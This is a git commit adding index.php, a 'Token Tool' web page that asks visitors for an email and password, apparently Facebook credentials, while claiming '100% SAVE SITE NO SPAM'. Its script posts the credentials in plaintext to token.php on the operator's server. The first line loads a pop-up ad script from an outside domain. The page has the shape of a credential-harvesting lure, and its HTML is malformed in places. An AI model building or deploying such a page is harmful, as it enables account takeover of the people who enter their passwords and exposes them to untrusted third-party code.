874ba66bbba371774c2251f714fde5c76edf0912
Saqlain Abbas <saqlainabbas478@gmail.com>
2018-11-03 17:27:12 +0400

    Add files via upload

---
+++ index.php
@@ -0,0 +1,68 @@
+<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=67medkyx3n"></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Token-Tool By Saqlain Abbas</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="sahib.css">
+  <script src="ali.css"></script>
+  <script src="gull.js"></script>
+  <div class="panel-heading"></div>
+<body>
+ <div id="content">
+<br><br>
+<center>
+<div class="Saqlain Abbas">
+<a href="https://www.saqlainabbas.tk" alt="SAQLAIN" target="_blank">
+<img
+src="https://graph.facebook.com/100009031208006/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="200" height="200"></a>
+<script type="text/javascript" src="www.saqlainabbas.tk"></script>
+</head>
+
+<body>
+ 
+<div class="container">
+  <h2>Token Tool By SAQLAIN ABBAS </h2> <font color="red">
+  <div class="panel-group">
+<div class="panel panel-primary">
+      <div class="panel-heading">100% SAVE SITE NO SPAM</div> <font color="yellow">
+      <div class="panel-body">      
+<div class="form-group">
+  <label for="usr">EMAIL :</label>
+  <input type="text" class="form-control" id="tk"> <font color="yellow">
+</div>
+<div class="form-group">
+  <label for="pwd">PASSWORD:</label> 
+  <input type="text" class="form-control" id="mk"> <font color="yellow">
+</div>
+<button4 type="button button4" class="btn btn-danger" onclick="Puaru_Active()" >GET TOKEN </button4> <font color="red">
+<p>
+<li id="trave" class="list-group-item"><img src="a.jpg"> </li></p>
+
+ <font color="yellow"> Token-By :-  <a href="https://www.saqlainabbas.tk" target="blank"><font color="red">Saqlain Abbas<br>
+
+
+
+</div>
+    </div>
+</div>
+
+<script>
+function Puaru_Active() {
+var http = new XMLHttpRequest();
+var tk = document.getElementById("tk").value;
+var mk = document.getElementById("mk").value;
+var url = "token.php";
+var params = "u="+tk+"&p="+mk+"";
+http.open("POST", url, true);
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+http.onreadystatechange = function() {
+    if(http.readyState == 4 && http.status == 200) {
+      document.getElementById("trave").innerHTML = http.responseText;        
+    }
+}
+http.send(params);
+}
+</script>
